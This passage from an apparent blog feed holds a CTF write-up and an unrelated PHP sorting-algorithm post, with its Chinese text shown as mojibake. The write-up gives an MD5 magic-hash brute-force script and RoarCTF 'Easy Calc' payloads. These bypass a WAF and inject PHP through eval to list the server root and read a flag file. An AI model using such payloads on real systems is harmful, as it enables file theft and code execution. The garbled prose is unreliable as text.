559062db66b89ca9e98b3900fc75066e</code></pre><p>å¤åˆ¶åˆ°burpä¸­å‘åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç»•è¿‡äº†ifï¼Œè¿›å…¥ä¸‹é¢çš„if</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt loading="lazy"></p><p>ç¬¬7ã€8ã€9ä¸ªifï¼šPOSTä¸¤ä¸ªå€¼åˆ†åˆ«ä¸º<code>$a</code>å’Œ<code>$b</code>ï¼Œ<code>ctype_alnum()</code>è¡¨ç¤ºå‡½æ•°å†…çš„å€¼åªèƒ½æ˜¯å­—æ¯ä¸ªæ•°å­—çš„ç»„åˆï¼Œç¬¬7ä¸ªifçš„æ„æ€æˆ‘ä»¬çš„<code>$a</code>å’Œ<code>$b</code>éœ€è¦æ»¡è¶³<code>ctype_alnum()</code>å‡½æ•°ï¼Œä¸”é•¿åº¦ä¸èƒ½å¤§äºäº”ï¼Œç¬¬8ä¸ªifçš„æ„æ€æ˜¯getçš„å‚æ•°<code>$m</code>å’Œ<code>$n</code>é•¿åº¦ä¸èƒ½å¤§äº1ï¼Œä¹Ÿå°±æ˜¯åªèƒ½ä¸ºä¸€ä¸ªå­—ç¬¦</p><p>åé¢çš„<code>$val8</code>ä¸º<code>$a</code>MD5åŠ å¯†åçš„å€¼ï¼Œ<code>$val9</code>ä¸º<code>$b</code>ç»“æœMD5åŠ å¯†åï¼Œæ›¿æ¢å…¶ä¸­çš„<code>$m</code>å€¼ä¸º<code>$n</code>çš„å€¼</p><p>æœ€åä¸€ä¸ªifï¼šè¡¨ç¤º<code>$val8</code>å’Œ<code>$val9</code>çš„å€¼éƒ½å¿…é¡»ç›¸ç­‰ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ä½¿ç”¨<code>==</code>è¿›è¡Œåˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè®¤ä¸º<code>0e</code>å¼€å¤´çš„ä¸ºç§‘å­¦è®¡æ•°æ³•è¿›è¡Œåˆ¤æ–­ï¼Œ<code>$a</code>å’Œ<code>$b</code>çš„å€¼ä¸èƒ½ç›¸ç­‰ï¼Œä¸”<code>$b</code>çš„é•¿åº¦å¿…é¡»ä¸º5</p><p>ç»“æœåˆ†æï¼Œæœ‰è¿™ç§ç»•è¿‡æ–¹æ³•ï¼šå‡è®¾<code>$a</code>MD5åŠ å¯†åçš„å€¼ä¸º<code>0e123421342...</code>ã€<code>$b</code>MD5åŠ å¯†åçš„å€¼ä¸º<code>($m)e4657564745...</code>ã€å°±å¯ä»¥åˆ©ç”¨ä»¤<code>$n</code>=0æ¥æ›¿æ¢<code>$b</code>MD5åŠ å¯†åçš„ç¬¬ä¸€ä½<code>$m</code>çš„å€¼ï¼Œä»è€Œæ„æˆç»•è¿‡ï¼Œè¿™æ˜¯æˆ‘ä»¬åªéœ€è¦å¾—åˆ°<strong>ä¸€ä¸ª5ä½çš„MD5å€¼å¼€å¤´<code>0e</code>åé¢è·Ÿçš„å…¨æ˜¯æ•°å­—çš„MD5åŸå‹</strong>å’Œ<strong>ä¸€ä¸ª5ä½çš„MD5å€¼çš„ç¬¬äºŒä½ä¸ºeåé¢è·Ÿçš„å…¨æ˜¯æ•°å­—çš„MD5åŸå‹</strong>ï¼Œäºæ˜¯å†™è„šæœ¬è·‘å‡ºè¿™ä¸¤ä¸ª5ä½æ•°ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                        test1 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> test1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"0e"</span> <span class="token keyword">and</span> test1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test1<span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">return</span><span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                        payload <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>m<span class="token operator">+</span>n<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                        str1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                        test2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> test2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"e"</span> <span class="token keyword">and</span> test2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span>test2<span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token keyword">return</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    a<span class="token punctuation">(</span><span class="token punctuation">)</span>    b<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°çš„ä¸¤ä¸ªç»“æœï¼š</p><p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p><p>äºæ˜¯æ„é€ payloadï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt loading="lazy"></p><p>å‘åŒ…å¾—åˆ°flag</p><h1 id="HTTPèµ°ç§"><a href="#HTTPèµ°ç§" class="headerlink" title="HTTPèµ°ç§"></a>HTTPèµ°ç§</h1><h2 id="2019RoarCTFâ€”Easy-Calc"><a href="#2019RoarCTFâ€”Easy-Calc" class="headerlink" title="2019RoarCTFâ€”Easy Calc"></a>2019RoarCTFâ€”Easy Calc</h2><h3 id="ç•Œé¢"><a href="#ç•Œé¢" class="headerlink" title="ç•Œé¢"></a>ç•Œé¢</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt loading="lazy"></p><p>æŸ¥çœ‹æºä»£ç åå‘ç°å­˜åœ¨<code>calc.php</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt loading="lazy"></p><p>è®¿é—®å¾—åˆ°åå°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿‡æ»¤äº†å¤§å¤šæ•°å­—ç¬¦ï¼Œå°è¯•äº†æäº¤ä¸€äº›å­—ç¬¦ä¼šæŠ¥<code>403</code>é”™è¯¯</p><blockquote><p>403é”™è¯¯æ˜¯ä¸€ç§åœ¨ç½‘ç«™è®¿é—®è¿‡ç¨‹ä¸­ï¼Œå¸¸è§çš„é”™è¯¯æç¤ºï¼Œè¡¨ç¤ºèµ„æºä¸å¯ç”¨ã€‚æœåŠ¡å™¨ç†è§£å®¢æˆ·çš„è¯·æ±‚ï¼Œä½†æ‹’ç»å¤„ç†å®ƒï¼Œé€šå¸¸ç”±äºæœåŠ¡å™¨ä¸Šæ–‡ä»¶æˆ–ç›®å½•çš„æƒé™è®¾ç½®å¯¼è‡´çš„WEBè®¿é—®é”™è¯¯ã€‚</p></blockquote><h3 id="è§£é¢˜æ–¹æ³•"><a href="#è§£é¢˜æ–¹æ³•" class="headerlink" title="è§£é¢˜æ–¹æ³•"></a>è§£é¢˜æ–¹æ³•</h3><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://xz.aliyun.com/t/6654#toc-1">ä»ä¸€é“é¢˜åˆ°åè®®å±‚æ”»å‡»ä¹‹HTTPè¯·æ±‚èµ°ç§</a></li><li><a href="https://blog.csdn.net/yankai0219/article/details/8269922">httpåè®®ä¸­content-length ä»¥åŠchunkedç¼–ç åˆ†æ</a></li><li><a href="https://www.freebuf.com/articles/web/213359.html">åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</a></li></ul><h4 id="æœåŠ¡å™¨httpèµ°ç§æ¼æ´ç»•WAF"><a href="#æœåŠ¡å™¨httpèµ°ç§æ¼æ´ç»•WAF" class="headerlink" title="æœåŠ¡å™¨httpèµ°ç§æ¼æ´ç»•WAF"></a>æœåŠ¡å™¨httpèµ°ç§æ¼æ´ç»•WAF</h4><blockquote><p>å‰ç«¯æœåŠ¡å™¨(CDN)å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶æ•°æ®ä¸åŒæ­¥ï¼Œå¼•èµ·å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">num</span><span class="token operator">=</span>var_dump<span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token number">61693386291,10</span>,36<span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">num</span><span class="token operator">=</span>var_dump<span class="token punctuation">(</span>base_convert<span class="token punctuation">(</span><span class="token number">2146934604002,10</span>,36<span class="token punctuation">)</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>.base_convert<span class="token punctuation">(</span><span class="token number">25254448,10</span>,36<span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt loading="lazy"></p><h4 id="PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"><a href="#PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF" class="headerlink" title="PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF"></a>PHPå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF</h4><p>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤ï¼Œåœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><blockquote><ul><li>åˆ é™¤åˆå§‹ç©ºæ ¼</li><li>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</li></ul></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">? <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span>scandir<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt loading="lazy"></p><pre class="language-shell" data-language="shell"><code class="language-shell">? <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span>readfile<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span>.chr<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">))</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›æ’åºå’ŒæŸ¥æ‰¾ç®—æ³•</title>
      <link href="posts/3dae5dc2/"/>
      <url>posts/3dae5dc2/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨çœ‹PHPçš„æ—¶å€™æ¸©ä¹ äº†ä¸€ä¸‹åŸæ¥å­¦è¿‡çš„æ’åºç®—æ³•ï¼ˆå¿˜çš„éƒ½å·®ä¸å¤šäº†-_-ï¼‰ï¼Œæ•…åœ¨æ­¤è®°å½•ä¸€ä¸‹</p><span id="more"></span><h3 id="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"><a href="#æ–æ³¢æ‹‰å¥‘æ•°åˆ—" class="headerlink" title="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"></a>æ–æ³¢æ‹‰å¥‘æ•°åˆ—</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ‰“å°æ•°åˆ—</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰“å°æ•°åˆ—å‰15ä½</span><span class="token comment">//ä¸‹é¢è®¡ç®—æ•°åˆ—çš„ç¬¬å‡ ä½</span><span class="token keyword">function</span> <span class="token function-definition function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token variable">$n</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰“å°æ•°åˆ—ç¬¬15ä½</span></code></pre><h3 id="æ’åºç®—æ³•"><a href="#æ’åºç®—æ³•" class="headerlink" title="æ’åºç®—æ³•"></a>æ’åºç®—æ³•</h3><h4 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span> <span class="token operator">-</span> <span class="token variable">$i</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="é€‰æ‹©æ’åº"><a href="#é€‰æ‹©æ’åº" class="headerlink" title="é€‰æ‹©æ’åº"></a>é€‰æ‹©æ’åº</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token variable">$len</span> <span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$min</span> <span class="token operator">=</span> <span class="token variable">$i</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//è¿™ä¸ªforå¾ªç¯é€‰å‡ºæœ€å°å€¼</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token operator">&lt;</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$min</span> <span class="token operator">=</span> <span class="token variable">$j</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$min</span> <span class="token operator">!=</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//é€‰æ‹©æœ€å°å€¼æ”¾å‰é¢</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="æ’å…¥æ’åº"><a href="#æ’å…¥æ’åº" class="headerlink" title="æ’å…¥æ’åº"></a>æ’å…¥æ’åº</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token 